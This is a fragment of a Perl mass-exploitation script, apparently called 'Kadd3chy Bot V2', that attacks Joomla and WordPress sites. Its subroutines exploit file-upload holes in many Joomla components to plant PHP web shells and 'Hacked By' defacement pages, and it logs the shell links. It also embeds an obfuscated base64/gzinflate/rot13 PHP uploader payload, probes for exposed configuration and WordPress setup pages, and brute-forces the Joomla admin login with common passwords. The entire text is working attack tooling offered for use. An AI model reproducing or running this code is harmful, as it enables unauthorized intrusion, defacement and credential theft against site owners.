$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/Tar.php?mosConfig_absolute_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}

sub com_bsqsitestats(){            print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
  print color('bold white'),"com bsqsitestats .................. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/Tar.php?mosConfig_bsqsitestats_path=";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN	";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
print color('bold red');
print "Not Vulnerable";print color('bold white'),"\n";
print color('reset');
}}

################ comjdownloads #####################
sub comjdownloads(){
$file="Kadd3chy.rar";
$filez="Kadd3chy.php.php.j";
$jdup= $site . 'index.php?option=com_jdownloads&Itemid=0&view=upload';
$shellpath= $site . '/images/jdownloads/screenshots/Kadd3chy.php.j';

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $exploit = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Kadd3chy", mail=>"moat3z.kadd3chy@@gmail.com", filetitle =>"Kadd3chy Bot V2", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$file"], pic_upload=>["$filez"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);

my $checkshell = $ua->get("$shellpath")->content;
if($checkshell =~/Kadd3chy/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold white')," Exploiting ... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $shellpath\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$shellpath\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jdownloads";
print color('bold white')," Exploiting ... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ comjdownloads index #####################
sub comjdownloadsdef(){
$def = $site . '/images/jdownloads/screenshots/Kadd3chy.html.j';
$filee="Kadd3chyhtml.rar";
$filezz="Kadd3chy.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Kadd3chy", mail=>"moat3z.kadd3chy@gmail.com", filetitle =>"Kadd3chy", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploitx->content =~ /File Sent To The Server/) {


my $response = $ua->get("$def")->status_line;
if ($response =~ /200/){
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Jdownloads Index";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Index Uploaded\n";
print color('bold white'),"  Shell Link => $def\n";
open (TEXT, '>>Result/Index.txt');
print TEXT "$def\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Jdownloads Index";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
        }
}
else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Jdownloads Index";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";

}
}

################ comfabrik #####################
sub comfabrik(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $shell ="Kadd3chy.php";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$shell"], "name" => "Kadd3chy.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikupp="$site/media/Kadd3chy.php";

$checkcomfabrikupp = $ua->get("$comfabrikupp")->content;
if($checkcomfabrikupp =~/Kadd3chy/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik";
print color('bold white')," Exploiting ....... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $comfabrikupp\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$comfabrikupp\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik";
print color('bold white')," Exploiting ....... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ comfabrik index #####################
sub comfabrikdef(){
my $url = "$site/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1";
my $index ="Kadd3chy.txt";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["userfile" => ["$index"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]
           
            );

$comfabrikup="$site/media/Kadd3chy.txt";

$checkcomfabrikup = $ua->get("$comfabrikup")->content;
if($checkcomfabrikup =~/Hacked By Kadd3chy BOT V2/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik Index";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done File Uploaded\n";
print color('bold white'),"  Shell Link => $comfabrikup\n";
open (TEXT, '>>Result/Index.txt');
print TEXT "$comfabrikup\n";
close (TEXT);
$def = $comfabrikup;
zoneh();

}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik Index";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}
################ comfabrik2 #####################
sub comfabrik2(){
my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
my $shell ="Kadd3chy.php";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["file" => ["$shell"]]
           
            );

$comfabrikupp2="$site/Kadd3chy.php";

$checkcomfabrikupp = $ua->get("$comfabrikupp2")->content;
if($checkcomfabrikupp =~/"Kadd3chy\n";/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik2";
print color('bold white')," Exploiting ...... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $comfabrikupp2\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$comfabrikupp\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik2";
print color('bold white')," Exploiting ...... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ comfabrik index2 #####################
sub comfabrikdef2(){
my $url = "$site/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload";
my $index ="Kadd3chy.txt";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => ["file" => ["$index"]]
           
            );

$comfabrikup2="$site/Kadd3chy.txt";

$checkcomfabrikup = $ua->get("$comfabrikup2")->content;
if($checkcomfabrikup =~/Hacked By Kadd3chy BOT V2/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik Index2";
print color('bold white')," ................. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done File Uploaded\n";
print color('bold white'),"  Shell Link => $comfabrikup2\n";
open (TEXT, '>>Result/Index.txt');
print TEXT "$comfabrikup2\n";
close (TEXT);
$def = $comfabrikup2;
zoneh();


}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Fabrik2 Index";
print color('bold white')," ................. ";
print color('bold red'),"Not Vulnerable\n";
}
}


################ comadsmanager #####################
sub comadsmanager(){
my $url = "$site/index.php?option=com_adsmanager&task=upload&tmpl=component";

my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["Kadd3chydef.jpg"], name => "def.html"]
           
            );

$comadsmanagerup="$site/tmp/plupload/def.html";

$checkcomadsmanagerup = $ua->get("$comadsmanagerup")->content;
if($checkcomadsmanagerup =~/Hacked By Kadd3chy/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Ads Manager";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done File Uploaded\n";
print color('bold white'),"  Shell Link => $comadsmanagerup\n";
open (TEXT, '>>Result/Index.txt');
print TEXT "$comadsmanagerup\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Ads Manager";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}

sub comblog(){

my $url = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $ua->get("$url")->content;
if($checkblog =~/has been uploaded/) {
print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Blog";
print color('bold white')," Exploiting ......... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Exploit It It Manual\n";
    open(save, '>>Result/Try_Manuall.txt');   
    print save "[blog] $site\n";   
    close(save);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Blog";
print color('bold white')," Exploiting ......... ";
print color('bold red'),"Not Vulnerable\n";
}
}


sub comusers(){

my $url = "$site/index.php?option=com_users&view=registration";
my $checkomusers = $ua->get("$url")->content;
if($checkomusers =~/jform_email2-lbl/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Users";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Exploit It Manual\n";
    open(save, '>>Result/Try_Manuall.txt');   
    print save "[Com Users] $site\n";   
    close(save);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"Com Users";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
    }
}


################ mod_simplefileupload #####################
sub mod_simplefileupload(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/modules/mod_simplefileuploadv1.3/elements/udd.php";
$simplefileuploadsup= "$site/modules/mod_simplefileuploadv1.3/elements/Kadd3chy.php";

my $shell ="Kadd3chy.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ file=>["$shell"] , submit=>"Upload" ]);

$check = $ua->get($simplefileuploadsup)->content;
if ($check =~ /"Failed \n";/){
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"mod simplefileupload";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $simplefileuploadsup\n\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$simplefileuploadsup\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";

print color('bold white'),"mod simplefileupload";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n\n";
}
}


#################### wp install Checker ####################
sub wpinstallcheck(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
#/wp-admin/setup-config.php
#/wordpress/wp-admin/setup-config.php
#/wp-admin/setup-config.php
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Checking Wp Install ";
print color('bold white')," Exploiting .. ";
my $spyxy = $ua->get("$site/wp-admin/setup-config.php")->content;
my $spyxy2 = $ua->get("$site/wordpress/wp-admin/setup-config.php")->content;
my $spyxy3 = $ua->get("$site/wp-admin/setup-config.php")->content;

if($spyxy =~/Setup Configuration File/) {

    print color('bold green');
	    print  "[Found]\n ==> $site/wp-admin/setup-config.php\n";

    open(save, '>>Result/WordPress_Install.txt');
    print save "[Found] ==> $site/wp-admin/setup-config.php/n";
    close(save);
    print color('reset');

}
    elsif ($spyxy2 =~/Setup Configuration File/){
    print color('bold green');
	    print  "[Found]\n ==> $site/wordpress/wp-admin/setup-config.php\n";

	    open(save, '>>Result/WordPress_Install.txt');
    print save "[Found] ==> $site/wordpress/wp-admin/setup-config.php\n";
    close(save);
    print color('reset');

    } elsif ($spyxy3 =~/Setup Configuration File/){
    print color('bold green');
	    print  "[Found]\n ==> $site/wp-admin/setup-config.php\n";

	    open(save, '>>Result/WordPress_Install.txt');
    print save "[Found] ==> $site/wp-admin/setup-config.php\n";
    close(save);
    print color('reset');

    }
else{
print color('bold red'),"Not Vulnerable\n\n";
    print color('reset');



        }
	
}
################ com_redmystic #####################
sub redmy(){
my $indexa='<h5>Uploder Kadd3chy</h5>
<?php eval (gzinflate(base64_decode(str_rot13("ML/EF8ZjRZnsUrk/hVMOJaQZS19pZ3kkVNtX06qEFgnxAct0bH2RGin/zljgT/c2q9
/iih+BI40TaSguWq98TXxc4k0pOiufqT+K7WvibboK8kxCfTyZ6IddrWcAV5mKhyANXlg0FkNPkJ2wTHUTrlQtoJHUjjyFGycunTqKtI8lnvzPLRJ
DT6ZEPUoIKJWkYyewYRFaJxt+epn6S0qs39+umDuTfsEJnSmd3HRWTkCv/WgX54K4g98833KBSUHXv/Ygqsr+k4USOENPRjxM/ZkaAk56eYDM0xJ5
sK552h1khNHKr2lIXpZOhYvSs2VHZh8O8oKbPibYUutxFLYKpCY2KCo8Y7ByDy6D0l8=")))); ?>';

my $url = "$site/administrator/components/com_redmystic/chart/ofc-library/ofc_upload_image.php?name=add.php";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

my $gravityformsres = $ua->post($url, Content_Type => "multipart/form-data", Content => $indexa);

$gravityformsup = "$site/administrator/components/com_redmystic/chart/tmp-upload-images/add.php";
my $checkk = $ua->get("$site/administrator/components/com_redmystic/chart/tmp-upload-images/add.php")->content;
if($checkk =~/Uploder Kadd3chy/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com redmystic";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"    Shell Link => $gravityformsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$gravityformsup\n";
close (TEXT);
}
else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com redmystic";
print color('bold white')," Exploiting .. ";
print color('red'),"Not Vulnerable";
print color('bold white'),"\n";
}
}
################################################################
sub rocks(){

my $url = "$site/administrator/components/com_rokdownloads/assets/uploadhandler.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data',Content => ['Filedata' => ["Kadd3chyGrav.jpg"], "jpath" => "..%2F..%2F..%2F..%2F" ]);

$sexyup="$site/images/stories/Kadd3chyGrav.jpg";

$checkpofxwup = $ua->get("$sexyup")->content;
if($checkpofxwup =~/"Kadd3chy\n";/) {		

  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"rokdownloads";
print color('bold white')," Exploiting ...... ";
print color('bold green'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $uploadfolder\n";
    open(save, '>>Result/Shells.txt');   
print TEXT "$uploadfolder\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"rokdownloads";
print color('bold white')," Exploiting ...... ";
print color('red'),"Not Vulnerable\n";
}
}

################################################################
sub sujks(){

my $url = "$site/administrator/components/com_extplorer/uploadhandler.php";
my $shell ="Kadd3chyGrav.jpg";
my $field_name = "Filedata";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );

$sexyup="$site/images/stories/Kadd3chyGrav.jpg";

$checkpofxwup = $ua->get("$sexyup")->content;
if($checkpofxwup =~/Kadd3chy/) {		

  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com extplorer";
print color('bold white')," Exploiting ..... ";
print color('bold green'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  [Link] => $uploadfolder\n";
    open(save, '>>Result/Shells.txt');   
print TEXT "$uploadfolder\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"com extplorer";
print color('bold white')," Exploiting ..... ";
print color('red'),"Not Vulnerable\n";
}
}
################ com_jwallpapers fileupload #####################
sub facile(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/components/com_facileforms/libraries/jquery/uploadify.php";
$comjwallpapersup= "$site/components/com_facileforms/libraries/jquery/Kadd3chy.php";

my $shell ="Kadd3chy.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ Filedata=>["$shell"] , 'folder'=>'/components/com_facileforms/libraries/jquery/' ]);

$check = $ua->get($comjwallpapersup)->content;
if ($check =~ /"Failed \n";/){
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"comfacileforms";
print color('bold white')," ................. ";
print color('bold green'),"Done\n";
print color('red')," * ";
print color('reset');
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $comjwallpapersup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$comjwallpapersup\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"comfacileforms";
print color('bold white')," Exploiting .. ";
print color('red'),"Not Vulnerable\n";
}
}
################ Proclaim 9.1.1 #####################
sub Proclaim(){
my $url = "$site/index.php?option=com_biblestudy&view=mediafileform&layout=edit&id=1";

my $shell ="Kadd3chy.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$Proclaims="$site/images/biblestudy/media/Kadd3chy.php";
my $checkfoxup = $ua->get("$Proclaims")->content;
if ($checkfoxup =~ /"Failed \n";/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Proclaim";
print color('bold white')," Exploiting ..... ";
print color('bold green'),"Done\n";
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $Proclaims\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$Proclaims\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Proclaim";
print color('bold white')," Exploiting ..... ";
print color('red'),"Not Vulnerable\n";
}}
################ Jimtawl 2.1.6 #####################
sub Jimtawl(){
my $url = "$site/index.php?option=com_jimtawl&view=upload&task=upload&pop=true&tmpl=component";

my $shell ="Kadd3chy.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$Jimtawls="$site/media/Kadd3chy.php";

my $checkfoxup = $ua->get("$Jimtawls")->content;
if ($checkfoxup =~ /"Failed \n";/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jimtawl";
print color('bold white')," Exploiting ...... ";
print color('bold green'),"Done\n";
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $Jimtawls\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$Jimtawls\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com Jimtawl";
print color('bold white')," Exploiting ...... ";
print color('red'),"Not Vulnerable\n";
}}
################ NovaSFH 3.0.2  #####################
sub NovaSFH(){
my $url = "$site/administrator/index.php?option=com_novasfh&c=uploader";

my $shell ="Kadd3chy.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$NovaSFHs="$site/Kadd3chy.php";

my $checkfoxup = $ua->get("$NovaSFHs")->content;
if ($checkfoxup =~ /"Failed \n";/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com NovaSFH";
print color('bold white')," Exploiting ...... ";
print color('bold green'),"Done\n";
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $NovaSFHs\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$NovaSFHs\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com NovaSFH";
print color('bold white')," Exploiting ...... ";
print color('red'),"Not Vulnerable\n";
}}
################ com_collector #####################
sub collector(){
my $url = "$site/index.php?option=com_collector&view=filelist&tmpl=component&folder=&type=1";

my $shell ="Kadd3chy.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$collectors="$site/Kadd3chy.php";

my $checkfoxup = $ua->get("$collectors")->content;
if ($checkfoxup =~ /"Failed \n";/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com collector";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Done\n";
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $collectors\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$collectors\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com collector";
print color('bold white')," Exploiting .. ";
print color('red'),"Not Vulnerable\n";
}}
################ com_osproperty 2.0.2 #####################
sub osproperty(){
my $url = "$site/osproperty/?task=agent_register";

my $shell ="Kadd3chy.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$ospropertys="$site/images/osproperty/agent/Kadd3chy.php";

my $checkfoxup = $ua->get("$ospropertys")->content;
if ($checkfoxup =~ /"Failed \n";/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com osproperty";
print color('bold white')," Exploiting ... ";
print color('bold green'),"Done\n";
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $ospropertys\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$ospropertys\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com osproperty";
print color('bold white')," Exploiting ... ";
print color('red'),"Not Vulnerable\n";
}}
################ com_ksadvertiser #####################
sub ksadvertiser(){
my $url = "$site/index.php?option=com_ksadvertiser&Itemid=36&task=add&catid=0&lang=en";

my $shell ="Kadd3chy.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$ksadvertisers="$site/images/ksadvertiser/U0/Kadd3chy.php";

my $checkfoxup = $ua->get("$ksadvertisers")->content;
if ($checkfoxup =~ /"Failed \n";/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com ksadvertiser";
print color('bold white')," ................ ";
print color('bold green'),"Done\n";
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $ksadvertisers\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$ksadvertisers\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com ksadvertiser";
print color('bold white')," Exploiting .. ";
print color('red'),"Not Vulnerable\n";
}}
################ com_hwdvideoshare #####################
sub hwdvideoshare(){
my $url = "$site/com_hwdvideoshare/assets/uploads/flash/flash_upload.php?jqUploader=1";

my $shell ="Kadd3chy.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$hwdvideoshares="$site/tmp/Kadd3chy.php";

my $checkfoxup = $ua->get("$hwdvideoshares")->content;
if ($checkfoxup =~ /"Failed \n";/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com hwdvideoshare";
print color('bold white')," ................. ";
print color('bold green'),"Done\n";
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $hwdvideoshares\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$hwdvideoshares\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com hwdvideoshare";
print color('bold white')," ................. ";
print color('red'),"Not Vulnerable\n";
}}
################ mod_jfancy #####################
sub fancys(){
my $url = "$site/modules/mod_jfancy/script.php";

my $shell ="Kadd3chy.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$fancyss="$site/images/Kadd3chy.php";

my $checkfoxup = $ua->get("$fancyss")->content;
if ($checkfoxup =~ /"Failed \n";/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com fancys";
print color('bold white')," Exploiting ....... ";
print color('bold green'),"Done\n";
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $fancyss\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$fancyss\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com fancys";
print color('bold white')," Exploiting ....... ";
print color('red'),"Not Vulnerable\n";
}}
################ mod_artuploader #####################
sub artuploader(){
my $url = "$site/modules/mod_artuploader/upload.php";

my $shell ="Kadd3chy.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$artuploaders="$site/modules/mod_artuploader/Kadd3chy.php";

my $checkfoxup = $ua->get("$artuploaders")->content;
if ($checkfoxup =~ /"Failed \n";/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com artuploader";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Done\n";
print color('bold white'),"  Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $artuploaders\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$artuploaders\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com artuploader";
print color('bold white')," Exploiting .. ";
print color('red'),"Not Vulnerable\n";
}}
################joomla brute#######################################3
sub joomlabrute(){
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Start brute force";
print color('bold white')," ................. ";
print color('red'),"Wait\n";
$joomsite = $site . '/administrator/index.php';

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );


$getoken = $ua->get($joomsite)->content;
if ( $getoken =~ /name="(.*)" value="1"/ ) {
$token = $1 ;
}else{
print "  Can't Grabb Joomla Token !\n";
next OUTER;
}


@patsj=('123456','123456789','admin123','demo','admin123123','admin123321','12345','112233','Admin','admin123456','123','1234','admin','password','root');
foreach $pmasj(@patsj){
chomp $pmasj;
$joomuser = admin;
$joompass = $pmasj;
print color('red'),"  Trying: $joompass";
print " \n";
$joomlabrute = POST $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
$response = $ua->request($joomlabrute);

my $check = $ua->get("$joomsite")->content;
if ($check =~ /logout/){
print "- ";
print color('bold green'),"Done\n";
print color('reset');
open (TEXT, '>>Result/Joomla_Pass.txt');
print TEXT "$joomsite => User: $joomuser Pass: $joompass\n";
close (TEXT);
